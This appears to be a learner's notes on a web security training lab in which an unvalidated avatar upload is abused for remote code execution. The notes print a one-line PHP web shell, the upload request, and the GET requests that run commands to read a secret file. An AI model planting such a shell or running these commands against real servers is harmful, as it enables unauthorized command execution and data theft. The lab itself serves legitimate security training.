# Remote code execution via web shell upload

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

---

![[Pasted image 20240718051705.png]]

**hx6KcE4nc4fQodG5GuNBOPYQR0S40feDhx6KcE4nc4fQodG5GuNBOPYQR0S40feD**

```php
<?php echo system($_GET['command']); ?>
```

- Usage: Navigate to file upload location
- Modify URL: `/files/avaters/simple-cmdshell.php?command=whoami`

---

# Notes
## Lab1:
Remote code execution via web shell upload

login:
wiener:peter

shell:
```php
<?php echo system($_GET['command']); ?>
```

## Goal:
To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret

## Analysis:

### Part one - Upload File
upload file post request:
POST /my-account/avatar
	- no restrictions

address:
https://0a500063044e5843a18ce8a0006c0086.web-security-academy.net/my-account

response:
The file avatars/simple-cmdshell.php has been uploaded

### Part 2 - Execute Code
- navigate to directory
exploit get request:
GET /files/avatars/simple-cmdshell.php HTTP/2

address:
https://0a500063044e5843a18ce8a0006c0086.web-security-academy.net/files/avatars/simple-cmdshell.php

GET /files/avatars/simple-cmdshell.php?command=cat+/home/carlos/secret
## Solution:

POST /my-account/avatar/simple-cmdshell.php

GET /files/avatars/simple-cmdshell.php?command=cat+/home/carlos/secret

